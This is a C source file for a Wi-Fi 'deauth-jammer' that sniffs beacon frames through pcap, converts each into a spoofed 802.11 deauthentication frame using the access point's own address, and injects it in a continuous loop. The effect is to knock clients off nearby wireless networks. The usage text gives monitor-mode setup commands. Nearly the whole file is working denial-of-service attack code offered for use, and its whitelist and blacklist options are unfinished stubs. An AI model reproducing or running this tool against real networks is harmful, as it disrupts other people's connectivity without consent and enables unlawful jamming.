/*
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; version 2.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc.,
 *   51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 *
 *   Marco Porsch <>
 *   based on Packetspammer (c)2007 Andy Green <andy@warmcat.com>
 */

#include "deauth-jammer.h"
#include "radiotap.h"


static void hexDump (char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = addr;

    // Output description if given.
    if (desc != NULL)
        printf ("%s:\n", desc);

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf ("  %s\n", buff);

            // Output the offset.
            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }

    // And print the final ASCII bit.
    printf ("  %s\n", buff);
}

static int check_whitelist(struct ieee80211_mgmt *mgmt)
{
	int i;
	int found = 0;
	static const u8 ap_whitelist[] = {
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	};


	for (i = 0; i < sizeof(ap_whitelist) / ETH_ALEN; i++) {
		if (memcmp(mgmt->sa, ap_whitelist + i * ETH_ALEN, ETH_ALEN) == 0) {
			found = 1;
			break;
		}
	}

	return found;
}

static int check_blacklist(struct ieee80211_mgmt *mgmt)
{
	int i;
	int found = 0;
	static const u8 ap_blacklist[] = {
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	};

	for (i = 0; i < sizeof(ap_blacklist) / ETH_ALEN; i++) {
		if (memcmp(mgmt->sa, ap_blacklist + i * ETH_ALEN, ETH_ALEN) == 0) {
			found = 1;
			break;
		}
	}

	return found;
}

static int radiotap_parse(u8 *pcap)
{

//	// this is where we store a summary of the
//	// information from the radiotap header
//	typedef struct  {
//		int m_nChannel;
//		int m_nChannelFlags;
//		int m_nRate;
//		int m_nAntenna;
//		int m_nRadiotapFlags;
//	} __attribute__((packed)) rt_data_t;
//
//
//	struct ieee80211_radiotap_iterator rti;
//	rt_data_t rt_data;
	struct ieee80211_radiotap_header *rt_header;
	u16 rt_headerlen;

	rt_header = (struct ieee80211_radiotap_header *) pcap;
	rt_headerlen = le16_to_cpu(rt_header->it_len);

//	if (ieee80211_radiotap_iterator_init(&rti, rt_header, rt_headerlen) < 0)
//		return -1;
//
//	while (ieee80211_radiotap_iterator_next(&rti) == 0) {
//		switch (rti.this_arg_index) {
//		case IEEE80211_RADIOTAP_RATE:
//			rt_data.m_nRate = (*rti.this_arg);
//			break;
//		case IEEE80211_RADIOTAP_CHANNEL:
//			rt_data.m_nChannel =
//			    le16_to_cpu(*((u16 *)rti.this_arg));
//			rt_data.m_nChannelFlags =
//			    le16_to_cpu(*((u16 *)(rti.this_arg + 2)));
//			break;
//		case IEEE80211_RADIOTAP_ANTENNA:
//			rt_data.m_nAntenna = (*rti.this_arg) + 1;
//			break;
//		case IEEE80211_RADIOTAP_FLAGS:
//			rt_data.m_nRadiotapFlags = *rti.this_arg;
//			break;
//		}
//	}
//
//	printf("RX: Rate: %2d.%dMbps, Freq: %d.%dGHz, "
//	    "Ant: %d, Flags: 0x%X\n",
//	    rt_data.m_nRate / 2, 5 * (rt_data.m_nRate & 1),
//	    rt_data.m_nChannel / 1000,
//	    rt_data.m_nChannel - ((rt_data.m_nChannel / 1000) * 1000),
//	    rt_data.m_nAntenna,
//	    rt_data.m_nRadiotapFlags);

	return rt_headerlen;
}

void deauth_run(pcap_t *capture, int nDelay)
{
	u8 u8aSendBuffer[500];
	int ret;

	memset(u8aSendBuffer, 0, sizeof (u8aSendBuffer));
	while (1) {
		struct pcap_pkthdr * pcap_header = NULL;
		u8 *pcap = u8aSendBuffer;
		int rt_headerlen;
		struct ieee80211_mgmt *mgmt;

		// get next beacon capture
		ret = pcap_next_ex(capture, &pcap_header, (const u_char**)&pcap);
		if (ret < 0)
			break;
		if (ret != 1)
			continue;

		rt_headerlen = radiotap_parse(pcap);
		if (rt_headerlen < 0)
			continue;

		mgmt = (struct ieee80211_mgmt *) (pcap + rt_headerlen);

		if (!ieee80211_is_beacon(mgmt->frame_control))
			continue;

//		if (check_whitelist(mgmt))
//			continue;

		if (!check_blacklist(mgmt))
			continue;

		printf("sending deauth as %02x:%02x:%02x:%02x:%02x:%02x\n",
		       mgmt->sa[0],
		       mgmt->sa[1],
		       mgmt->sa[2],
		       mgmt->sa[3],
		       mgmt->sa[4],
		       mgmt->sa[5]);

		/*
		 * turn beacon into deauth:
		 * keep radiotap header unchanged,
		 * change STYPE to deauth,
		 * keep addresses unchanged,
		 * increase sequence number,
		 * add reason code
		 */
		mgmt->frame_control |= cpu_to_le16(IEEE80211_STYPE_DEAUTH);
		mgmt->seq_ctrl = cpu_to_le16(le16_to_cpu(mgmt->seq_ctrl) + 1000);
		mgmt->u.deauth.reason_code = cpu_to_le16(WLAN_REASON_DEAUTH_LEAVING);

		ret = pcap_inject(capture, pcap, rt_headerlen + 24 + 2);
		if (ret != (rt_headerlen + 24 + 2)) {
			perror("Trouble injecting packet");
			break;
		}

		if (nDelay)
			usleep(nDelay);
	}
}

void usage(void)
{
	printf(
	    "Usage: deauth-jammer [options] <interface>\n\nOptions\n"
	    "-d/--delay <delay> Delay between packets\n"
	    "-b/--blacklist <delay> Delay between packets\n"
	    "-w/--delay <delay> Delay between packets\n"
	    "\nExample:\n"
	    "  sudo iw phy0 interface add mon0 type monitor\n"
	    "  sudo ifconfig mon0 up\n"
	    "  sudo packetspammer mon0\n"
	    "\n");

	exit(1);
}


int main(int argc, char *argv[])
{
	char szErrbuf[PCAP_ERRBUF_SIZE];
	int nDelay = 100000, ret;
	pcap_t *capture = NULL;
	struct bpf_program bpfprogram;
	char * szProgram = "type mgt subtype beacon";

	while (1) {
		int nOptionIndex;
		static const struct option options[] = {
			{ "delay", required_argument, NULL, 'd' },
			{ "blacklist", optional_argument, NULL, 'b' },
			{ "whitelist", optional_argument, NULL, 'w' },
			{ 0, 0, 0, 0 }
		};
		ret = getopt_long(argc, argv, "dbw:hf",
			options, &nOptionIndex);
		if (ret == -1)
			break;

		switch (ret) {
		case 0: // long option
			break;
		case 'h': // help
			usage();
		case 'd': // delay
			nDelay = atoi(optarg);
			break;
		case 'b': // blacklist
			printf("TODO %c\n", ret);
			exit(0);
			break;
		case 'w': // whitelist
			printf("TODO %c\n", ret);
			exit(0);
			break;
		default:
			printf("unknown switch %c\n", ret);
			usage();
			break;
		}
	}

	if (optind >= argc)
		usage();


	// open the interface in pcap
	szErrbuf[0] = '\0';
	capture = pcap_open_live(argv[optind], 800, 1, 20, szErrbuf);
	if (capture == NULL) {
		printf("Unable to open interface %s in pcap: %s\n",
		    argv[optind], szErrbuf);
		return (1);
	}

	switch (pcap_datalink(capture)) {
		case DLT_PRISM_HEADER:
		case DLT_IEEE802_11_RADIO:
			break;
		default:
			printf("!!! unknown encapsulation on %s !\n", argv[1]);
			return (1);
	}

	if (pcap_compile(capture, &bpfprogram, szProgram, 1, 0) == -1) {
		puts(szProgram);
		puts(pcap_geterr(capture));
		return (1);
	} else {
		if (pcap_setfilter(capture, &bpfprogram) == -1) {
			puts(szProgram);
			puts(pcap_geterr(capture));
		}
		pcap_freecode(&bpfprogram);
	}

	pcap_setnonblock(capture, 1, szErrbuf);

	deauth_run(capture, nDelay);

	return (0);
}
